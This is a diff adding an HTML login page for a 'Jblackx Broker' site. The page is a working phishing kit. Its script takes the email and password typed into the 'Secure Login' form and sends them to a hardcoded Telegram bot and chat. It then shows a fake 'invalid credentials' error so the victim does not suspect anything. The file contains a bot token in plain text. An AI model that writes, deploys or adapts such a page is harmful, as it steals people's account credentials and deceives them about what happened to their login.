@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login - Jblackx Broker</title>
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+  <div class="container">
+    <h2>🔐 Secure Login</h2>
+    <form id="loginForm">
+      <label for="email">📧 Email or Username</label>
+      <input type="text" id="email" name="email" required />
+
+      <label for="password">🔑 Password</label>
+      <input type="password" id="password" name="password" required />
+
+      <button type="submit" class="btn">Login</button>
+      <p class="small">Don’t have an account? <a href="signup.html">Sign Up</a></p>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      const message = `🟨 *New Login Request:*\n👤 User: \`${email}\`\n🔑 Pass: \`${password}\`\n📆 Time: ${new Date().toLocaleString()}`;
+      
+      const token = "8313979154:AAFQ9nl0yINqmAp3dgpOrSwrNAeP9YN1k3g";
+      const chat_id = "@Officialwoongna";
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(() => {
+        alert("Login failed: Invalid credentials."); // fake error
+        document.getElementById("loginForm").reset();
+      });
+    });
+  </script>
+</body>
+</html>
